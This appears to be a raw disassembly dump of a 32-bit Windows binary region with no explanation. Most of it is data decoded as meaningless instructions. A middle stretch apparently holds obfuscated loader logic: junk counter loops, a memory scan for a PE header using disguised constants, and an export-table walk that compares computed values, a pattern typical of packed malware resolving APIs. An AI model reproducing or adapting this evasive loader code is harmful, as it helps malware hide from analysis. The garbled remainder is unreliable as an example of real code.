  40e178:	cmp    eax,0xa4a7383d
  40e17d:	mov    ch,0x97
  40e17f:	adc    al,bl
  40e181:	leave  
  40e182:	cmp    al,BYTE PTR [ebp+0xf]
  40e185:	fld    TBYTE PTR [esi+0x2d]
  40e188:	test   DWORD PTR [ebp-0x1d],esp
  40e18b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e18c:	xchg   ecx,eax
  40e18d:	lea    edi,[ecx]
  40e18f:	sub    bl,cl
  40e191:	jb     0x40e134
  40e193:	dec    DWORD PTR [edi+0x1e]
  40e196:	dec    edx
  40e197:	and    BYTE PTR [ebp-0xb],ch
  40e19a:	push   ebx
  40e19b:	inc    esp
  40e19c:	(bad)  
  40e19d:	aad    0x2c
  40e19f:	call   DWORD PTR [esi+0x29a1b879]
  40e1a5:	pop    ecx
  40e1a6:	outs   dx,DWORD PTR ds:[esi]
  40e1a7:	adc    al,0x27
  40e1a9:	dec    ecx
  40e1aa:	test   DWORD PTR [edx-0x7607760e],ebp
  40e1b0:	or     BYTE PTR [eax+eiz*1-0x48],dl
  40e1b4:	or     eax,0x75a70ba6
  40e1b9:	jb     0x40e222
  40e1bb:	pop    edx
  40e1bc:	xor    DWORD PTR gs:[esi-0x66c99f31],0xffffff8a
  40e1c4:	xor    al,0x8b
  40e1c6:	mov    ecx,0x9cf0a1b7
  40e1cb:	sbb    al,0x93
  40e1cd:	jmp    0xa9f3:0xba402d2c
  40e1d4:	sti    
  40e1d5:	in     al,0xbf
  40e1d7:	mov    bx,0x9046
  40e1db:	fwait
  40e1dc:	sbb    edx,esi
  40e1de:	iret   
  40e1df:	push   esp
  40e1e0:	lahf   
  40e1e1:	dec    eax
  40e1e2:	ins    DWORD PTR es:[edi],dx
  40e1e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1e4:	jae    0x40e245
  40e1e6:	loope  0x40e191
  40e1e8:	jmp    0xa7cd:0xe8d2ed8d
  40e1ef:	dec    eax
  40e1f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1f1:	jl     0x40e1d9
  40e1f3:	push   0x27e291e1
  40e1f8:	push   esi
  40e1f9:	vpackuswb xmm0,xmm1,XMMWORD PTR [ecx-0x7bd7cbf3]
  40e201:	stos   DWORD PTR es:[edi],eax
  40e202:	faddp  st(7),st
  40e204:	shl    DWORD PTR [ecx],1
  40e206:	jnp    0x40e1ab
  40e208:	stos   DWORD PTR es:[edi],eax
  40e209:	mov    WORD PTR [ecx-0x293d3dc5],es
  40e20f:	sub    DWORD PTR [eax+0x287006a7],esp
  40e215:	and    BYTE PTR [ebp+0xd],0x56
  40e219:	cli    
  40e21a:	jl     0x40e1cd
  40e21c:	xor    esi,DWORD PTR [ebp+0x8]
  40e21f:	stos   BYTE PTR es:[edi],al
  40e220:	xlat   BYTE PTR ds:[ebx]
  40e221:	ret    
  40e222:	stos   DWORD PTR es:[edi],eax
  40e223:	iret   
  40e224:	pusha  
  40e225:	mov    ebp,0x75c6f94a
  40e22a:	push   edx
  40e22b:	in     al,dx
  40e22c:	sbb    eax,0x2cf73c62
  40e231:	(bad)  
  40e232:	pop    esp
  40e233:	outs   dx,BYTE PTR ds:[esi]
  40e234:	jo     0x40e2ac
  40e236:	pop    ss
  40e237:	push   0xd4ea9b8f
  40e23c:	leave  
  40e23d:	icebp  
  40e23e:	push   ds
  40e23f:	jb     0x40e2a2
  40e241:	xor    ch,BYTE PTR [eax+0x327cbb93]
  40e247:	mov    ecx,0xd9fe0ec7
  40e24c:	mov    eax,0x33988819
  40e251:	test   eax,0xdbe440bb
  40e256:	xor    BYTE PTR [edi],ch
  40e258:	mov    ebp,0xc84947e5
  40e25d:	add    eax,0xd1cebb98
  40e262:	and    ebp,ebp
  40e264:	push   ebp
  40e265:	mov    ah,0xaa
  40e267:	loop   0x40e2cf
  40e269:	gs cdq 
  40e26b:	inc    esp
  40e26c:	push   ecx
  40e26d:	(bad)  [ebp-0x1ea3eecb]
  40e273:	mov    WORD PTR [edx-0xe4d8bd1],?
  40e279:	arpl   WORD PTR [ebx-0xb2a824d],ax
  40e27f:	gs push ebx
  40e281:	div    ch
  40e283:	fld    DWORD PTR [esi*8-0x390e41f]
  40e28a:	jnp    0x40e260
  40e28c:	push   es
  40e28d:	push   edi
  40e28e:	xchg   ebp,eax
  40e28f:	mov    bx,0x16c1
  40e293:	shl    DWORD PTR [ebx+0x1b77ca1c],1
  40e299:	xor    al,0xe
  40e29b:	jmp    0x40e317
  40e29d:	sar    DWORD PTR [eax-0x2d],1
  40e2a0:	ja     0x40e29b
  40e2a2:	rcr    dh,1
  40e2a4:	push   ss
  40e2a5:	cmc    
  40e2a6:	sub    bh,dl
  40e2a8:	or     BYTE PTR [ebx+0x1e],bh
  40e2ab:	jle    0x40e2ec
  40e2ad:	and    BYTE PTR [ebx],dl
  40e2af:	mov    ecx,0xc5ee1770
  40e2b4:	push   ss
  40e2b5:	sbb    esp,DWORD PTR [edi+0x1864a1c4]
  40e2bb:	xor    BYTE PTR [ebx+0x278c1c1d],0x7c
  40e2c2:	push   ebp
  40e2c3:	mov    ch,0x89
  40e2c5:	rcl    edi,1
  40e2c7:	loop   0x40e30e
  40e2c9:	jae    0x40e28d
  40e2cb:	loopne 0x40e337
  40e2cd:	mov    bl,0xa3
  40e2cf:	jecxz  0x40e306
  40e2d1:	int3   
  40e2d2:	xor    DWORD PTR [eax+0x278836b5],ecx
  40e2d8:	mov    bl,0x69
  40e2da:	arpl   WORD PTR [esi],sp
  40e2dc:	popa   
  40e2dd:	or     eax,0xfcc465d0
  40e2e2:	jmp    0x3b24:0x456cd601
  40e2e9:	cwde   
  40e2ea:	sbb    edi,DWORD PTR [ecx+0xc83e880]
  40e2f0:	or     dl,BYTE PTR [edi+0x7c2d6b6c]
  40e2f6:	repz xchg esi,eax
  40e2f8:	mov    esp,0x44443ac4
  40e2fd:	(bad)  
  40e2fe:	mov    ss,WORD PTR [ecx-0x1f]
  40e301:	xor    BYTE PTR gs:[esi],0xa7
  40e305:	mov    esp,0x89e27325
  40e30a:	push   ss
  40e30b:	xor    al,0xb2
  40e30d:	cs fild QWORD PTR ss:[edx+0x1da5f64e]
  40e315:	jne    0x40e34f
  40e317:	test   eax,0xfecd1833
  40e31c:	(bad)  
  40e31d:	mov    ah,0x1c
  40e31f:	and    al,0xc8
  40e321:	iret   
  40e322:	iret   
  40e323:	cmp    eax,0xb6f3435e
  40e328:	mov    bh,cl
  40e32a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e32b:	xchg   BYTE PTR [ebx-0x47],dh
  40e32e:	stos   BYTE PTR es:[edi],al
  40e32f:	inc    edx
  40e330:	into   
  40e331:	clc    
  40e332:	pusha  
  40e333:	xchg   edi,eax
  40e334:	xor    eax,0x88ed4ab0
  40e339:	cmp    eax,0xc50291c
  40e33e:	adc    al,0xdf
  40e340:	mov    edi,0x27f17d93
  40e346:	pop    ss
  40e347:	inc    edx
  40e348:	int3   
  40e349:	cmp    esi,DWORD PTR [edx+0x713f42da]
  40e34f:	mov    al,ds:0x6f5518c4
  40e354:	mov    al,dh
  40e356:	ret    
  40e357:	mov    bl,0xf8
  40e359:	pop    ecx
  40e35a:	jo     0x40e3c1
  40e35c:	(bad)  
  40e35d:	sub    eax,0x6b5f3de5
  40e362:	adc    edx,eax
  40e364:	in     al,0xc0
  40e366:	mov    bh,0xc7
  40e368:	push   0xd69c8742
  40e36d:	inc    edx
  40e36e:	popf   
  40e36f:	rcl    BYTE PTR [ebx-0x1d],1
  40e372:	cs in  al,dx
  40e374:	imul   BYTE PTR [ebx+ecx*8+0x4e3b7503]
  40e37b:	add    eax,edx
  40e37d:	imul   eax,DWORD PTR [esi]
  40e380:	or     esi,0x11ff
  40e386:	mov    esi,DWORD PTR [ebp+0x8]
  40e389:	or     DWORD PTR ds:0x420e7e,0x420fac
  40e393:	xor    esi,ecx
  40e395:	and    DWORD PTR ds:0x420e7a,0x420f6c
  40e39f:	add    esi,edx
  40e3a1:	mov    DWORD PTR ds:0x420f04,0x5e6d
  40e3ab:	cmp    esi,eax
  40e3ad:	mov    eax,0x6dd0
  40e3b2:	mov    eax,DWORD PTR [ebp-0x4]
  40e3b5:	push   ebx
  40e3b6:	mov    DWORD PTR ds:0x420efc,0x12bd
  40e3c0:	je     0x40e450
  40e3c6:	and    DWORD PTR ds:0x420e92,0x0
  40e3d0:	jmp    0x40e3e2
  40e3d5:	mov    esi,DWORD PTR ds:0x420e92
  40e3db:	inc    esi
  40e3dc:	mov    DWORD PTR ds:0x420e92,esi
  40e3e2:	cmp    DWORD PTR ds:0x420e92,0x1b
  40e3e9:	jae    0x40e407
  40e3ef:	cmp    DWORD PTR ds:0x420e92,0x23
  40e3f6:	jne    0x40e402
  40e3fc:	call   DWORD PTR ds:0x424811
  40e402:	jmp    0x40e3d5
  40e407:	mov    esi,DWORD PTR [ebp-0x18]
  40e40a:	add    DWORD PTR [eax],esi
  40e40c:	add    eax,esi
  40e40e:	mov    eax,DWORD PTR [ebp-0x4]
  40e411:	sub    esi,DWORD PTR ds:0x420fb0
  40e417:	mov    esi,DWORD PTR [ebp+0xc]
  40e41a:	xor    DWORD PTR ds:0x420efc,0x420e8e
  40e424:	xor    esi,ecx
  40e426:	add    esi,edx
  40e428:	sbb    DWORD PTR ds:0x420ef8,0x67e3
  40e432:	imul   esi,DWORD PTR [eax]
  40e435:	mov    DWORD PTR ds:0x420f00,0x5d4a
  40e43f:	mov    DWORD PTR [eax],esi
  40e441:	mov    DWORD PTR ds:0x420efc,0x3930
  40e44b:	jmp    0x40e4ec
  40e450:	mov    esi,DWORD PTR [ebp+0x14]
  40e453:	and    DWORD PTR ds:0x420f68,0x0
  40e45d:	mov    ebx,DWORD PTR ds:0x420f68
  40e463:	inc    ebx
  40e464:	mov    DWORD PTR ds:0x420f68,ebx
  40e46a:	cmp    DWORD PTR ds:0x420f68,0x21
  40e471:	jne    0x40e482
  40e477:	push   0x420f08
  40e47c:	call   DWORD PTR ds:0x424815
  40e482:	cmp    DWORD PTR ds:0x420f68,0x19
  40e489:	jb     0x40e45d
  40e48f:	and    DWORD PTR ds:0x42201c,0x0
  40e499:	mov    edi,DWORD PTR ds:0x42201c
  40e49f:	inc    edi
  40e4a0:	mov    DWORD PTR ds:0x42201c,edi
  40e4a6:	cmp    DWORD PTR ds:0x42201c,0xd
  40e4ad:	jne    0x40e4c3
  40e4b3:	push   0x5b5d
  40e4b8:	push   0x5762
  40e4bd:	call   DWORD PTR ds:0x4247d5
  40e4c3:	cmp    DWORD PTR ds:0x42201c,0xc
  40e4ca:	jne    0x40e4dd
  40e4d0:	mov    edi,DWORD PTR ds:0x42201c
  40e4d6:	inc    edi
  40e4d7:	mov    DWORD PTR ds:0x42201c,edi
  40e4dd:	cmp    DWORD PTR ds:0x42201c,0x16
  40e4e4:	jb     0x40e499
  40e4ea:	xor    DWORD PTR [eax],esi
  40e4ec:	adc    ebx,DWORD PTR ds:0x420f58
  40e4f2:	mov    eax,DWORD PTR [ebp-0x4]
  40e4f5:	mov    edi,DWORD PTR [ebp+0x10]
  40e4f8:	mov    ebx,DWORD PTR ds:0x420ebe
  40e4fe:	mov    esi,DWORD PTR ds:0x420f80
  40e504:	sub    ebx,esi
  40e506:	add    ebx,DWORD PTR [ebx+esi*1]
  40e509:	xor    edi,ecx
  40e50b:	mov    ebx,DWORD PTR ds:0x420fb0
  40e511:	add    DWORD PTR ds:0x420efc,ebx
  40e517:	mov    esi,0xffcd8d23
  40e51c:	inc    ebx
  40e51d:	mov    ebx,esi
  40e51f:	sub    ebx,edi
  40e521:	add    DWORD PTR [eax],ebx
  40e523:	adc    edi,0x4f91
  40e529:	mov    eax,DWORD PTR [ebp-0x4]
  40e52c:	mov    edi,DWORD PTR [ebp-0x8]
  40e52f:	xor    DWORD PTR ds:0x420e8e,0x422014
  40e539:	add    edi,DWORD PTR [eax]
  40e53b:	mov    DWORD PTR [ebp-0x8],edi
  40e53e:	mov    eax,DWORD PTR [ebp+0xc]
  40e541:	mov    edi,DWORD PTR [ebp+0xc]
  40e544:	xor    edi,ecx
  40e546:	xor    eax,ecx
  40e548:	lea    eax,[eax+edi*1+0x64e5ba]
  40e54f:	mov    edi,DWORD PTR [ebp+0xc]
  40e552:	xor    edi,ecx
  40e554:	add    edi,edx
  40e556:	imul   eax,edi
  40e559:	mov    edi,DWORD PTR [ebp+0xc]
  40e55c:	xor    edi,ecx
  40e55e:	sub    edi,eax
  40e560:	mov    eax,DWORD PTR [ebp-0x4]
  40e563:	add    edi,edx
  40e565:	cmp    DWORD PTR [eax],edi
  40e567:	mov    eax,DWORD PTR [ebp-0x4]
  40e56a:	mov    edi,DWORD PTR [ebp+0x10]
  40e56d:	jg     0x40e580
  40e573:	xor    edi,ecx
  40e575:	mov    ebx,esi
  40e577:	sub    ebx,edi
  40e579:	add    DWORD PTR [eax],ebx
  40e57b:	jmp    0x40e586
  40e580:	xor    edi,ecx
  40e582:	add    edi,edx
  40e584:	add    DWORD PTR [eax],edi
  40e586:	mov    eax,DWORD PTR [ebp-0x8]
  40e589:	mov    edi,DWORD PTR [ebp-0x10]
  40e58c:	mov    eax,DWORD PTR [eax]
  40e58e:	xor    edi,ecx
  40e590:	add    edi,0x3272dc
  40e596:	not    edi
  40e598:	and    eax,edi
  40e59a:	movsx  di,BYTE PTR [eax+0x1]
  40e59f:	mov    ebx,0x3b4c
  40e5a4:	sub    di,bx
  40e5a7:	mov    ebx,0x8a89
  40e5ac:	xor    di,bx
  40e5af:	mov    ebx,0x4f87
  40e5b4:	cmp    di,bx
  40e5b7:	jne    0x40e5df
  40e5bd:	movsx  di,BYTE PTR [eax]
  40e5c1:	mov    ebx,0x3b4c
  40e5c6:	sub    di,bx
  40e5c9:	mov    ebx,0x8a89
  40e5ce:	xor    di,bx
  40e5d1:	mov    ebx,0x4f88
  40e5d6:	cmp    di,bx
  40e5d9:	je     0x40e5ef
  40e5df:	mov    edi,DWORD PTR [ebp-0x10]
  40e5e2:	xor    edi,ecx
  40e5e4:	mov    ebx,esi
  40e5e6:	sub    ebx,edi
  40e5e8:	add    eax,ebx
  40e5ea:	jmp    0x40e59a
  40e5ef:	mov    esi,DWORD PTR [ebp-0x14]
  40e5f2:	mov    esi,DWORD PTR [esi]
  40e5f4:	mov    edi,DWORD PTR [eax+0x3c]
  40e5f7:	lea    esi,[edi+esi*8+0x78]
  40e5fb:	mov    esi,DWORD PTR [esi+eax*1]
  40e5fe:	mov    DWORD PTR [ebp-0x8],esi
  40e601:	mov    esi,DWORD PTR [ebp+0x8]
  40e604:	xor    esi,ecx
  40e606:	add    esi,edx
  40e608:	mov    DWORD PTR [ebp-0x14],esi
  40e60b:	mov    esi,DWORD PTR [ebp+0x8]
  40e60e:	mov    edi,DWORD PTR [ebp-0x8]
  40e611:	xor    esi,ecx
  40e613:	add    esi,edx
  40e615:	pop    ebx
  40e616:	cmp    edi,esi
  40e618:	jne    0x40e636
  40e61e:	mov    eax,DWORD PTR [ebp+0xc]
  40e621:	xor    eax,ecx
  40e623:	mov    ecx,DWORD PTR [ebp-0x8]
  40e626:	add    eax,edx
  40e628:	imul   eax,ecx
  40e62b:	mov    DWORD PTR [ebp-0x8],eax
  40e62e:	push   DWORD PTR [ebp+0x18]
  40e631:	jmp    0x410a04
  40e636:	mov    ecx,DWORD PTR [ebp-0x8]
  40e639:	add    ecx,eax
  40e63b:	mov    DWORD PTR [ebp-0x14],ecx
  40e63e:	mov    ecx,DWORD PTR [ebp-0x14]
  40e641:	mov    ecx,DWORD PTR [ecx+0xc]
  40e644:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e649:	mov    edx,0x3b4c
  40e64e:	sub    cx,dx
  40e651:	mov    edx,0x8a89
  40e656:	xor    cx,dx
  40e659:	mov    edx,0x4e76
  40e65e:	jmp    0x4109d8
  40e663:	stc    
  40e664:	add    BYTE PTR [edx+ebp*1],bh
  40e667:	pop    ss
  40e668:	push   cs
  40e669:	sti    
  40e66a:	or     ebx,DWORD PTR [ebx]
  40e66c:	mov    edx,0x16415ef2
  40e671:	xor    eax,0x7aca73b3
  40e676:	jp     0x40e691
  40e678:	pop    edi
  40e679:	jp     0x40e6f5
  40e67b:	jb     0x40e6af
  40e67d:	fnsave [ebp+edx*1+0x4c6fbd09]
  40e684:	jns    0x40e6fa
  40e686:	add    edi,edx
  40e688:	mov    ch,0xe8
  40e68a:	das    
  40e68b:	inc    esp
  40e68c:	sub    edx,esp
  40e68e:	ss xor eax,0x3ff8facc
  40e694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e695:	adc    DWORD PTR ds:0x399a8662,edx
  40e69b:	mov    ch,ah
  40e69d:	mov    ds:0xc5135529,al
  40e6a2:	xchg   esi,eax
  40e6a3:	ja     0x40e637
  40e6a5:	leave  
  40e6a6:	sbb    bh,BYTE PTR [ebp+0x7eb83c7d]
  40e6ac:	lds    edi,FWORD PTR [ebx+0x5dd8587f]
  40e6b2:	fucomip st,st(4)
  40e6b4:	pop    ecx
  40e6b5:	nop
  40e6b6:	pop    ecx
  40e6b7:	popa   
  40e6b8:	in     al,0xfd
  40e6ba:	or     al,0xb9
  40e6bc:	pop    esi
  40e6bd:	in     eax,dx
  40e6be:	sub    ebx,DWORD PTR [esp+ecx*2+0x78]
  40e6c2:	jno    0x40e661
  40e6c4:	sbb    BYTE PTR [eax],dh
  40e6c6:	xchg   ecx,eax
  40e6c7:	fwait
  40e6c8:	pop    ecx
  40e6c9:	and    DWORD PTR [eax+0xa],ebx
  40e6cc:	mov    dh,0xd8
  40e6ce:	xor    DWORD PTR [edi-0x15],0xffffff83
  40e6d2:	pop    ds
  40e6d3:	xor    BYTE PTR [ebp+eiz*4+0x51],ch
  40e6d7:	rcl    BYTE PTR ds:[edx],1
  40e6da:	mov    esi,0x6da0d566
  40e6df:	pop    esi
  40e6e0:	pop    ss
  40e6e1:	shr    BYTE PTR [edi+eiz*2-0x7f],0xa9
  40e6e6:	cs leave 
  40e6e8:	hlt    
  40e6e9:	scas   al,BYTE PTR es:[edi]
  40e6ea:	mov    edi,0x4e89728c
  40e6ef:	stos   DWORD PTR es:[edi],eax
  40e6f0:	dec    eax
  40e6f1:	out    dx,al
  40e6f2:	adc    BYTE PTR [ebx+0x30],dl
  40e6f5:	pop    ebp
  40e6f7:	neg    BYTE PTR [ecx]
  40e6f9:	stc    
  40e6fa:	pop    es
  40e6fb:	cmp    BYTE PTR [ecx],dh
  40e6fd:	or     al,0xbf
  40e6ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e700:	push   0xffffff97
  40e702:	pushf  
  40e703:	sbb    dh,bh
  40e705:	scas   al,BYTE PTR es:[edi]
  40e706:	inc    esi
  40e707:	jne    0x40e730
  40e709:	lock inc edi
  40e70b:	jne    0x40e76e
  40e70d:	fdiv   DWORD PTR [edi]
  40e70f:	lahf   
  40e710:	dec    eax
  40e711:	jmp    0x6f5c:0x25f223ad
  40e718:	sub    bl,BYTE PTR [ebx+edx*4-0x9e3953]
  40e71f:	fldln2 
  40e721:	xor    bh,BYTE PTR [edx+ebx*2-0x517ec74a]
  40e728:	jmp    0x40e6ca
  40e72a:	xor    ebp,eax
  40e72c:	and    DWORD PTR [ebp+0x6d9d635e],ebp
  40e732:	mov    dh,0x0
  40e734:	xchg   ecx,eax
  40e735:	mov    ds:0x46849647,al
  40e73a:	mov    al,0x17
  40e73c:	cmp    al,0xc2
  40e73e:	in     al,0xf8
  40e740:	(bad)  
  40e741:	int    0xe7
  40e743:	cwde   
  40e744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e745:	out    dx,eax
  40e746:	sub    dl,dh
  40e748:	jge    0x40e74c
  40e74a:	das    
  40e74b:	sahf   
  40e74c:	ror    DWORD PTR ds:[esi],1
  40e74f:	sbb    bl,BYTE PTR ds:0xa7c12b5c
  40e755:	sub    DWORD PTR [edi],0x9d4802b9
  40e75b:	inc    edx
  40e75c:	push   ebp
  40e75d:	sbb    ebp,edi
  40e75f:	fwait
  40e760:	xor    DWORD PTR [ebp+0x31],eax
  40e763:	ds js  0x40e762
  40e766:	jbe    0x40e6f0
  40e768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e769:	and    al,0x64
  40e76b:	icebp  
  40e76c:	enter  0x3f4e,0x63
  40e770:	mov    dl,0xdf
  40e772:	xor    DWORD PTR [esi+esi*2],eax
  40e775:	sbb    dl,dl
  40e777:	mov    ebp,DWORD PTR [esi+0x5]
  40e77a:	pop    edx
  40e77b:	push   0x90180b1f
  40e780:	jae    0x40e7bb
  40e782:	stc    
  40e783:	or     DWORD PTR [eax-0x7573002d],edi
  40e789:	dec    esp
  40e78a:	inc    ax
  40e78c:	xor    DWORD PTR [ebx],esp
  40e78e:	pop    ss
  40e78f:	xlat   BYTE PTR ds:[ebx]
  40e790:	xchg   edx,eax
  40e791:	inc    edx
  40e792:	adc    bl,BYTE PTR [ebx]
  40e794:	push   esi
  40e795:	(bad)  
  40e796:	(bad)  
  40e798:	imul   esi,esi,0xfca72379
  40e79e:	cwde   
  40e79f:	xchg   ebx,eax
  40e7a0:	scas   eax,DWORD PTR es:[edi]
  40e7a1:	lock into 
  40e7a3:	sub    DWORD PTR [edx],ebp
  40e7a5:	jg     0x40e75f
  40e7a7:	or     al,bh
  40e7a9:	cmp    al,0x92
  40e7ab:	dec    edx
  40e7ac:	lea    edx,[eax]
  40e7ae:	out    0x7a,al
  40e7b0:	not    DWORD PTR [ebp+0x1f]
  40e7b3:	mov    eax,ds:0xefd27cc5
  40e7b8:	cld    
  40e7b9:	cmp    al,0x87
  40e7bb:	xor    al,0x8d
  40e7bd:	add    BYTE PTR [esi+0x3e206e73],bh
  40e7c3:	or     edi,DWORD PTR [eax-0xd]
  40e7c6:	into   
  40e7c7:	and    eax,0x5df0d48e
  40e7cc:	push   edi
  40e7cd:	pop    es
  40e7ce:	adc    BYTE PTR [eax+0xe],bh
  40e7d1:	adc    DWORD PTR [edi],ebx
  40e7d3:	mul    DWORD PTR [ebx]
  40e7d5:	cmp    eax,0x119b88b3
  40e7da:	int3   
  40e7db:	scas   eax,DWORD PTR es:[edi]
  40e7dc:	push   esp
  40e7dd:	cmp    DWORD PTR [edi-0x4a],0xa
  40e7e1:	xor    bl,ch
  40e7e3:	repz std 
  40e7e5:	cdq    
  40e7e6:	mov    ebx,0x7874dd6f
  40e7eb:	mov    ebp,0x901c1a90
  40e7f0:	jo     0x40e7d9
  40e7f2:	cmc    
  40e7f3:	repnz cwde 
  40e7f5:	mov    DWORD PTR [edx+edi*8-0x79],esp
  40e7f9:	adc    dh,ch
  40e7fb:	sahf   
  40e7fc:	lds    ecx,FWORD PTR [edx+0x7e]
  40e7ff:	cwde   
  40e800:	out    0xa6,eax
  40e802:	(bad)  [eiz*2+0x4d692ab8]
  40e809:	mov    fs,WORD PTR [edi]
  40e80b:	mov    eax,0x9db036be
  40e810:	(bad)  
  40e811:	jmp    0x40e889
  40e813:	push   ss
  40e814:	sub    esp,DWORD PTR [ebx+0x50]
  40e817:	cmp    eax,0xf98c34bd
  40e81c:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40e81e:	sar    BYTE PTR [eax-0x2790fdf3],0x7b
  40e825:	bound  ecx,QWORD PTR [esi]
  40e827:	or     al,0x4b
  40e829:	adc    DWORD PTR [edi-0x30],edi
  40e82c:	daa    
  40e82d:	arpl   WORD PTR [esi],di
  40e82f:	dec    ecx
  40e830:	jge    0x40e81e
  40e832:	jns    0x40e87a
  40e834:	push   cs
  40e835:	cmp    al,0xc5
  40e837:	scas   al,BYTE PTR es:[edi]
  40e838:	or     al,0xf2
  40e83a:	mov    ebp,0xca23d9f2
  40e83f:	or     DWORD PTR [ecx+0x1f],ecx
  40e842:	mov    WORD PTR [ebx+0x267bb743],ss
  40e848:	pop    esp
  40e849:	mov    bl,0xb5
  40e84b:	jo     0x40e7f5
  40e84d:	inc    edx
  40e84e:	adc    eax,0xe4f2774d
  40e853:	push   0x6f99829
  40e858:	mov    eax,0x47389c5
  40e85d:	rcr    ch,cl
  40e85f:	test   DWORD PTR [ebx-0x15aeb732],0x2d6a49ae
  40e869:	jmp    0xc07ce915
  40e86e:	or     BYTE PTR [edx-0x437d2039],ch
  40e874:	pop    edi
  40e875:	dec    ecx
  40e876:	fnsave [esi]
  40e878:	sbb    edx,ebp
  40e87a:	jo     0x40e81e
  40e87c:	jnp    0x40e8af
  40e87e:	sub    esi,esi
  40e880:	adc    al,0xf
  40e882:	xchg   esp,eax
  40e883:	pop    es
  40e884:	(bad)  
  40e885:	rcl    DWORD PTR ds:0x47110dae,cl
  40e88b:	pop    edi
  40e88c:	sub    edi,DWORD PTR [esi+edi*2-0x5db47b8f]
  40e893:	mov    edx,DWORD PTR [edx-0x53]
  40e896:	enter  0x1c64,0x1
  40e89a:	xchg   esp,eax
  40e89b:	in     al,0xb5
  40e89d:	arpl   WORD PTR [esp+ebp*8],dx
  40e8a0:	retf   
  40e8a1:	daa    
  40e8a2:	fnstenv [edi+0x2921b9f5]
  40e8a8:	daa    
  40e8a9:	cmp    eax,0x5a665e22
  40e8ae:	lods   eax,DWORD PTR ds:[esi]
  40e8af:	rcl    esp,1
  40e8b1:	sbb    BYTE PTR [ebx-0x7e],dh
  40e8b4:	mov    al,ds:0xc93bd3a9
  40e8b9:	fistp  QWORD PTR [edx-0x35]
  40e8bc:	mov    edi,0x9d3a6bad
  40e8c1:	enter  0xdf67,0xc2
  40e8c5:	jmp    0x40e89e
  40e8c7:	mov    edi,0x682b19fd
  40e8cc:	in     eax,dx
  40e8cd:	sbb    DWORD PTR [ebp-0x3d],esp
  40e8d0:	xor    edx,DWORD PTR [ebx]
  40e8d2:	aas    
  40e8d3:	lods   al,BYTE PTR ds:[esi]
  40e8d4:	mov    BYTE PTR [ecx+ecx*2-0x654b9540],dl
  40e8db:	xchg   edx,eax
  40e8dc:	mov    dh,BYTE PTR [esi+edx*1+0x34]
  40e8e0:	cli    
  40e8e1:	mov    ?,WORD PTR [edi-0x60]
  40e8e4:	scas   al,BYTE PTR es:[edi]
  40e8e5:	cmp    eax,0x9b90f6c5
  40e8ea:	stos   DWORD PTR es:[edi],eax
  40e8eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8ec:	repz in eax,0x6c
  40e8ef:	inc    esi
  40e8f0:	mov    dl,0x89
  40e8f2:	outs   dx,DWORD PTR ds:[esi]
  40e8f3:	pop    edi
  40e8f4:	test   eax,0x576a392f
  40e8f9:	pop    ebp
  40e8fa:	loop   0x40e936
  40e8fc:	ds push ecx
  40e8fe:	pop    ebx
  40e8ff:	push   edx
  40e900:	pusha  
  40e901:	jns    0x40e8b5
  40e903:	mov    ds:0x7b890f9a,al
  40e908:	cmc    
  40e909:	out    dx,eax
  40e90a:	(bad)  
  40e90b:	ficomp DWORD PTR [ecx+ecx*1+0x76c28c7c]
  40e912:	cmp    al,0xa8
  40e914:	sti    
  40e915:	cmp    ah,al
  40e917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e918:	mov    bl,0x5
  40e91a:	fchs   
  40e91c:	sub    edi,esp
  40e91e:	push   ebp
  40e91f:	test   al,0xf5
  40e921:	mov    ebp,edx
  40e923:	and    BYTE PTR [edi+edi*1+0x1c],dl
  40e927:	int    0x3c
  40e929:	mov    ah,0xc9
  40e92b:	mov    al,ds:0x6c2966b1
  40e930:	inc    ecx
  40e931:	and    BYTE PTR [ebp+eiz*2-0x32f93d0b],bl
  40e938:	in     al,0x9e
  40e93a:	pop    ds
  40e93b:	mov    eax,0x387b3ad6
  40e940:	mov    esi,0x20f5f4f6
  40e945:	inc    ebx
  40e946:	repz sub eax,0x7d9612d5
  40e94c:	lea    edx,[ecx+0x51093419]
  40e952:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e953:	pop    ecx
  40e954:	xchg   ebp,eax
  40e955:	push   esp
  40e956:	idiv   DWORD PTR [edx]
  40e958:	sbb    esi,DWORD PTR [ecx-0x2ee716c9]
  40e95e:	add    DWORD PTR [ecx+0x2ec1f81f],0x7bf2ca3a
  40e968:	adc    bh,BYTE PTR [edi+0x41ba2a1b]
  40e96e:	add    esi,DWORD PTR [esi+0x10]
  40e971:	add    al,0x1
  40e973:	add    DWORD PTR [eax+ecx*4+0x47512dae],esi
  40e97a:	and    al,0x18
  40e97c:	inc    ecx
  40e97d:	mov    ah,0x21
  40e97f:	sub    DWORD PTR [edi-0x7362473],0x2b8782d5
  40e989:	setle  BYTE PTR [edx]
  40e98c:	sti    
  40e98d:	pop    es
  40e98e:	in     eax,dx
  40e98f:	nop
  40e990:	sub    ecx,DWORD PTR [esi-0x4f]
  40e993:	sub    bh,BYTE PTR [edi-0x3]
  40e996:	lods   eax,DWORD PTR ds:[esi]
  40e997:	jl     0x40e97c
  40e999:	sbb    al,0x6e
  40e99b:	(bad)  
  40e99c:	push   ecx
  40e99d:	or     al,0xc8
  40e99f:	ins    BYTE PTR es:[edi],dx
  40e9a0:	div    BYTE PTR [ebx+0x3a3cb323]
  40e9a6:	call   0x301d:0x4dadf2cc
  40e9ad:	mov    DWORD PTR [ebp+0x4da29e93],edi
  40e9b3:	je     0x40e943
  40e9b5:	dec    edi
  40e9b6:	xor    al,0xec
  40e9b8:	iret   
  40e9b9:	and    DWORD PTR [eax+0x6b59890a],ecx
  40e9bf:	mov    ds:0x7e49f2b9,eax
  40e9c4:	les    edx,FWORD PTR [eax-0x40db95bd]
  40e9ca:	sbb    DWORD PTR [eax+0xb],edx
  40e9cd:	clc    
  40e9ce:	pop    ecx
